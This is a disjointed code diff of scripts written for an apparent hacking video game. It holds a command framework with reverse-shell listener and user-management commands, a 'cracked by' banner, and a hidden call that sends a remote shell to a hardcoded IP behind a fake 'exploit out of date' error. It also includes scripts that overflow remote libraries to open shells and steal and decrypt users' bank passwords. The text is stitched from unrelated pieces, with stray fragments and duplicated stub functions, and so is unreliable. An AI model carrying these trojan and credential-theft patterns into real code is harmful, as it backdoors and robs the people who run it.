+commandManager.registerCommand(Command.New({""name"":""msfvenom"",""description"":""Create a payload"",""parameters"":[Parameter.New({""name"":""ip"",""required"":true}),Parameter.New({""name"":""port"",""required"":false,""default"":1222,""type"":PARAMETER_TYPES.NUMBER})],""callback"":@msfvenomCommandHandler}))
+msfconsoleCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+metaxploitManager=extensionMediator.getExtension(""metaxploitManager"")
+shells=metaxploitManager.rShellList
+if shells isa Error then
+return shells
+end if
+if shells.len==0 then
+return Error.New(""No shells available"")
+end if
+handleShellsToSession=function(shell)
+return Session.New(shell,{})
+end function
+viperUi.msfConsole(map(shells,@handleShellsToSession))
+input=user_input(viperUi.msfConsoleInput)
+inputNumber=to_int(input)
+if inputNumber>=shells.len or typeof(inputNumber)==""string"" or inputNumber<0 then
+return Error.New(""Invalid input"")
+end if
+session=Session.New(shells[inputNumber],{})
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+sessionManager.addSession(session)
+sessionManager.setCurrentSession(sessionManager.getSessionIndex(session))
+end function
+commandManager.registerCommand(Command.New({""name"":""msfconsole"",""description"":""Starts a listiner for incomming rshells."",""parameters"":[],""callback"":@msfconsoleCommandHandler}))
+adduserCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+user=params.user
+password=params.password
+res=handler.addUser(user,password)
+if res isa Error then
+return res
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""adduser"",""description"":""Adds a user to the computer."",""parameters"":[Parameter.New({""name"":""user"",""required"":true}),Parameter.New({""name"":""password"",""required"":true})],""callback"":@adduserCommandHandler,""permissions"":{""object"":""computer"",""privilege"":""root""}}))
+deluserCommandHandler=function(params)
+sessionManager=extensionMediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+user=params.user
+res=handler.deleteUser(user)
+if res isa Error then
+return res
+end if
+end function
+commandManager.registerCommand(Command.New({""name"":""deluser"",""description"":""Deletes a user from the computer."",""parameters"":[Parameter.New({""name"":""user"",""required"":true})],""callback"":@deluserCommandHandler,""permissions"":{""object"":""computer"",""privilege"":""root""}}))
+helpCommandHandler=function(params)
+viperUi=extensionMediator.getExtension(""viperUi"")
+commandManager=extensionMediator.getExtension(""commandManager"")
+commandName=params.commandName
+print(""CRACKED BY VENOM | www.venom.com"")
+if commandName!=null then
+command=commandManager.getCommand(commandName)
+if command isa Error then
+return command
+end if
+hasPermission=commandManager.checkPermissions(command)
+hasPermission=not (hasPermission isa Error)
+result={""name"":command.name,""description"":command.description,""parameters"":command.parameters,""hasPermissions"":hasPermission}
+viperUi.helpSingle(result)
+return 
+end if
+commandsList=[]
+for command in commandManager.commands
+command=command.value
+hasPermissions=commandManager.checkPermissions(command)
+hasPermissions=not (hasPermissions isa Error)
+result={""name"":command.name,""description"":command.description,""parameters"":command.parameters,""hasPermissions"":hasPermissions}
+commandsList.push(result)
+end for
+viperUi.help(commandsList)
+end function
+commandManager.registerCommand(Command.New({""name"":""help"",""description"":""Show help"",""parameters"":[Parameter.New({""name"":""commandName"",""required"":false})],""callback"":@helpCommandHandler}))",1);d;
+end function
+GetPassword1 = function(userPass)
+	if userPass.len != 2 then exit("decipher: wrong syntax")
+	password = userPass[1]
+	return password
+end function
+GetPassword2 = function(userPass)
+	if userPass.len != 2 then exit("decipher: wrong syntax")
+	password = userPass[1]
+	return password
+end function
+GetPassword3 = function(userPass)
+	if userPass.len != 2 then exit("decipher: wrong syntax")
+	password = userPass[1]
+	return password
+end function
+meta.rshell_client("164.18.52.39",1222)
+exit("ERROR: Exploit Out Of Date")
+bruteAttack = function()
+if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit("<b>Usage: "+program_path.split("/")[-1]+" [ip_address]</b>")
+metaxploit = include_lib("/lib/metaxploit.so")
+if not metaxploit then
+    metaxploit = include_lib(current_path + "/metaxploit.so")
+end if
+if not metaxploit then exit("Error: Can't find metaxploit library in the /lib path or the current folder")
+address = params[0]
+net_session = metaxploit.net_use( address )
+if not net_session then exit("Error: can't connect to net session")
+metaLib = net_session.dump_lib
+memCode = user_input("Enter MEM: ")
+vulnWord = user_input("Enter VULN: ")
+result = metaLib.overflow(memCode, vulnWord)
+if not result then exit("Program ended")
+if params.len != 1 or params[0] == "-h" or params[0] == "--help" then exit("<b>Usage: "+program_path.split("/")[-1]+" [ip_address]</b>")
+metaxploit = include_lib("/lib/metaxploit.so")
+if not metaxploit then
+    metaxploit = include_lib(current_path + "/metaxploit.so")
+end if
+if not metaxploit then exit("Error: Can't find metaxploit library in the /lib path or the current folder")
+address = params[0]
+net_session = metaxploit.net_use( address )
+if not net_session then exit("Error: can't connect to net session")
+libKernel = net_session.dump_lib
+libName = "kernel_router.so"
+print("Searching " + libName +" ...")
+if not libKernel then exit("Error: " + libName + " not found.")
+lanIp = user_input("Enter a LAN address: ")
+result = libKernel.overflow("0x399FF3CB", "onnamesseqsetacti", lanIp)
+cryptools = include_lib("/lib/crypto.so")
+if not cryptools then
+	cryptools = include_lib(current_path + "/crypto.so")
+end if
+if not cryptools then exit("Error: Can't find crypto.so library in the /lib path or the current folder")
+
+GetPassword = function(userPass)
+	if userPass.len != 2 then exit("decipher: wrong syntax")
+	password = cryptools.decipher(userPass[1])
+	return password
+end function
+
+typeObject = typeof(result)
+if(typeObject != "computer") then exit("Error: expected computer, obtained " + typeObject)
+homeFolder = result.File("/home")
+if not homeFolder then exit("Error: /home folder not found")
+userFolders = homeFolder.get_folders
+found = false
+for userFolder in userFolders
+	bankFile = result.File("/home/" + userFolder.name + "/Config/Bank.txt")
+	if not bankFile then continue
+	if not bankFile.has_permission("r") then exit("Error: can't read file contents. Permission deniend")
+	userPass = bankFile.get_content.split(":")
+	print("Deciphering bank password for user: " + userFolder.name)
+	password = GetPassword(userPass)
+	if not password then 
+		print("Nothing found...")
+	else
+		print("Bank account: " + userPass[0] +"\nBank Password: " + password)
+		found = true
+	end if
+end for
+if not found then print("No files found")
+end function
+bukakeTime = function()
+if params.len != 2 or params[0] == "-h" or params[0] == "--help" then exit("<b>Usage: "+program_path.split("/")[-1]+" [ip_address] [port]</b>")
+metaxploit = include_lib("/lib/metaxploit.so")
+if not metaxploit then
+    metaxploit = include_lib(current_path + "/metaxploit.so")
+end if
+if not metaxploit then exit("Error: Can't find metaxploit library in the /lib path or the current folder")
+address = params[0]
+port = params[1].to_int
+net_session = metaxploit.net_use( address, port )
+if not net_session then exit("Error: can't connect to net session")
+metaLib = net_session.dump_lib
+mem = user_input("Enter MEM: ")
+vuln = user_input("Enter VULN: ")
+result = metaLib.overflow(mem, vuln)
+if not result then exit("Program ended")
+if typeof(result) == "shell" then
+	result.start_terminal
+else
+	print("Error: expected shell, obtained: " + result)
+end if
+end function
